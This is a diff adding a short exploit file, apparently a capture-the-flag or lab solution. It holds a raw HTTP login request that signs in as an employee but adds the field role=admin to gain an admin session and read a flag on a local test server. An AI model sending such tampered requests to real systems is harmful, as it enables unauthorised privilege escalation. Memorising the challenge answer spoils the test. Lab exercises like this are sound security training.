@@ -1,0 +1,8 @@
+# Login as emp (employee) but supply role=admin to get admin session. Then access /admin/dashboard to see flag.
+
+POST /login HTTP/1.1
+Host: 172.17.0.1:52651
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 44
+
+username=emp&password=emppassword&role=admin
